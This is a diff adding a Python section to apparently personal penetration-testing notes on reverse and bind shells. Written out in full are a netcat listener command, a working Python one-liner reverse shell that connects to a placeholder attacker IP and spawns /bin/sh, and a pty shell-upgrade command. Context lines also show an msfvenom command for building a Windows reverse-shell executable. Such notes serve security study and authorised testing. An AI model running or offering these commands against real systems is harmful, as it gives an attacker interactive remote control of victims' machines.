@@ -40,6 +40,10 @@ Victim connnects and attacker listens. Used 95% of the time.
 	- windows: `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f exe -o reverse.exe`
 	- linux: 
 	- attacker can set up a listener with netcat of metasploit's multi/handler
+- python
+	- attacker runs: `nc -nlvp 4444`
+	- victim runs: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("PUT-IP-HERE",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
+	- upgrade a bad shell with pty: `python -c 'import pty; pty.spawn("/bin/bash")'` 
 
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
